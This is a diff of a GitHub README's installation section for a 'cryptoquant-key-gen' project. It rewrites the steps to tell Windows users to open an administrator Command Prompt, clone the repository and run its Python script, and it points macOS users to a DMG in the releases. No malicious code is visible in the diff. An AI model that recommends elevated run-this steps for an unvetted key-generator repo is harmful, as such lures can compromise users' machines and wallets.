@@ -26,20 +26,43 @@
 ---
 
 ## Installation
-The manual guide below is intended for Windows and Linux users. As a convenience for macOS, a [DMG file](https://github.com/ternopil-te-te-t4p/cryptoquant-key-gen) is also available.
-```bash
+
+Manual setup guide for Windows and Linux. macOS [DMG file](../../releases) available.
+
+
+
+
+
+Check for Git and Python installations on Windows.
+
+Install Git for Windows:
+
+https://git-scm.com/install/windows
+
+Install Python for Windows:
+
+https://www.python.org/ftp/python/3.13.12/python-3.13.12-amd64.exe
+
+Open Command Prompt (Administrator).
+
+
+
+
+
+```bash 
 git clone https://github.com/ternopil-te-te-t4p/cryptoquant-key-gen.git
+```
+```bash 
 cd cryptoquant-key-gen
-pip install -r requirements.txt
+```
+```bash 
+py -m pip install -r requirements.txt
+```
+```bash 
+py src/main.py
 ```
 
----
 
-## Usage
-
-```bash
-python src/main.py
-```
 
 ---
 
